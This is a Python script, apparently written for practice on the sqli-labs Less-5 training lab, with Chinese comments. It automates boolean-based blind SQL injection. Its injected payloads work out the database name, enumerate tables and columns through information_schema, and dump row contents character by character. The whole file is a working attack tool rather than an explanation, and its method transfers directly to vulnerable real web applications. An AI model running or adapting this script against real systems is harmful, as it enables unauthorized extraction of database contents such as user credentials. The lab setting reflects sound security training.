import requests
url = 'http://192.168.1.158/sqlilabs/Less-5/?id=1'
db_length = 0
db_name = ''
table_num = 0
table_len = 0
table_name = ''
table_list = []
column_num = 0
column_len = 0
column_name = ''
column_list = []
dump_num = 0
dump_len = 0
dump_name = ''
dump_list = []
i = j = k = 0
### 当前数据库名长度 ###
for i in range(1,20):
    db_payload = '''' and (length(database())=%d)--+''' %i
    # print(url+db_payload)
    r = requests.get(url+db_payload)
    if "You are in" in r.text:
        db_length = i
        print('当前数据库名长度为：%d' % db_length)
        break
### 当前数据库名 ###
print('开始猜解数据库名......')
for i in range(1,db_length+1):
    for j in range(95,123):
        db_payload = '''' and (left(database(),%d)='%s')--+''' % (i,db_name+chr(j))
        r = requests.get(url+db_payload)
        if "You are in" in r.text:
            db_name += chr(j)
            # print(db_name)
            break
print('数据库名：\n[+]',db_name)
### 当前数据库表的数目 ###
for i in range(100):
    db_payload = '''' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+''' % (i,db_name)
    r = requests.get(url+db_payload)
    # print(url+db_payload)
    if "You are in" in r.text:
        table_num = i
        break
print('一共有%d张表' % table_num)
print('开始猜解表名......')
### 每张表的表名长度及表名 ###
for i in range(table_num):
    table_len = 0
    table_name = ''
    #### 表名长度 ####
    for j in range(1,21):
        db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema="security" limit %d,1),%d,1))--+''' % (i,j)
        r = requests.get(url+db_payload)
        # print(db_payload)
        if "You are in" not in r.text:
            table_len = j-1
            #### 猜解表名 ####
            for k in range(1,table_len+1):
                for l in range(95,123):
                    db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+''' % (i,k,l)
                    # print(db_payload)
                    r = requests.get(url+db_payload)
                    # print(db_payload)
                    if "You are in" in r.text:
                        table_name += chr(l)
            print(table_name)
            table_list.append(table_name)
            break
print('表名：',table_list)
### 每个表的列的数目、列名及列名长度 ###
for i in table_list:
    #### 每个表的列的数目 ####
    for j in range(100):
        db_payload = '''' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+''' % (
        j, i)
        r = requests.get(url + db_payload)
        if "You are in" in r.text:
            column_num = j
            print(("[+] 表名：%-10s\t" % i) + str(column_num) + '字段')
            break
#### 猜解列名长度 ####
column_num = 3
print('%s表中的列名：' % table_list[-1])
for j in range(3):
    column_name = ''
    for k in range(1,21):
        db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name="%s" limit %d,1),%d,1))--+''' % (table_list[-1],j,k)
        r = requests.get(url+db_payload)
        if "You are in" not in r.text:
            column_len = k-1
            # print(column_len)
            break
        #### 猜解列名 ####
        for l in range(95,123):
            db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name="%s" limit %d,1),%d,1))=%d--+''' % (table_list[-1],j,k,l)
            r = requests.get(url + db_payload)
            if "You are in" in r.text:
                column_name += chr(l)
    print('[+] ',column_name)
    column_list.append(column_name)
print('开始爆破以下字段：',column_list[1:])
for column in column_list[1:]:
    print(column,'：')
    dump_num = 0
    for i in range(30):
        db_payload = '''' and %d=(select count(%s) from %s.%s)--+''' % (i,column,db_name,table_list[-1])
        # print(db_payload)
        r = requests.get(url+db_payload)
        if "You are in" in r.text:
            dump_num = i
            # print(i)
            break
    for i in range(dump_num):
        dump_len = 0
        dump_name = ''
        #### 字段长度 ####
        for j in range(1, 21):
            db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+''' % (column,db_name,table_list[-1],i,j)
            r = requests.get(url + db_payload)
            if "You are in" not in r.text:
                dump_len = j-1
                for k in range(1, dump_len + 1):
                    for l in range(1,256):
                        db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+''' % (column,db_name,table_list[-1],i,k,l)
                        # print(db_payload)
                        r = requests.get(url+db_payload)
                        if "You are in" in r.text:
                            dump_name += chr(l)
                            # print(dump_name)
                            break
                break
        print('[+]',dump_name)